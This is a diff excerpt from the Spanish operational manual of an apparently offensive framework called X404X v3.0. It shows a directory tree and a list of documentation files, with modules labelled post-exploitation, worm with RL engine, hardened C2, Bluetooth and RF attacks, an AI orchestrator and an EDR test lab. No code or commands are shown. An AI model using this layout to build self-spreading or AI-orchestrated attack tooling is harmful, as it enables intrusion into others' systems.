+│   │   └── v27/, v29/, v210/      Versiones avanzadas
+│   ├── agent/                     Post-explotación
+│   ├── appstate/                  FSM + AI orchestrator
+│   ├── bridge/                    Wazero WASM bridge
+│   └── dispatch/                  Dispatcher + MITRE
+├── modules/bridge/                Python bridge
+│   ├── bridge.py                  RPC router
+│   └── handlers/                  12 archivos, ~170 handlers
+├── plugins/                       Plugins modulares
+│   ├── worm/                      Worm + RL engine
+│   ├── operations/                Argos agents
+│   ├── pulse-c2/                  C2 hardened
+│   ├── ai/                        AI plugins
+│   ├── blue/bluesky/              Bluetooth attacks
+│   └── rf_contagion/              RF SDR
+├── lab/                           EDR test environment
+├── pkg/proto/                     gRPC protos
+├── docs/                          Documentación
+├── scripts/                       Scripts auxiliares
+├── deploy/deploy.sh               One-click deploy
+├── ROADMAP.md                     Plan de desarrollo
+├── README.md                      Documentación principal
+└── requirements.txt               Dependencias Python
+```
+
+### 16.2 Documentación Adicional
+
+| Documento | Contenido |
+|-----------|-----------|
+| `README.md` | Visión general, quick start, badges |
+| `ROADMAP.md` | Plan de fases, módulos propuestos |
+| `docs/ARCHITECTURE.md` | Arquitectura detallada |
+| `docs/COMMANDS.md` | Referencia CLI completa |
+| `docs/CONSOLE.md` | Consola interactiva |
+| `docs/MODULES.md` | Catálogo de bridge handlers |
+| `docs/CREATIVITY.md` | Contribuciones académicas |
+| `docs/TESTING_GUIDE.md` | Guía de testing |
+| `CHANGELOG.md` | Historial de cambios |
+| `SECURITY.md` | Política de seguridad |
+| `CONTRIBUTING.md` | Guía de contribución |
+
+---
+
+*X404X v3.0 — Manual Operacional Completo — 2026*
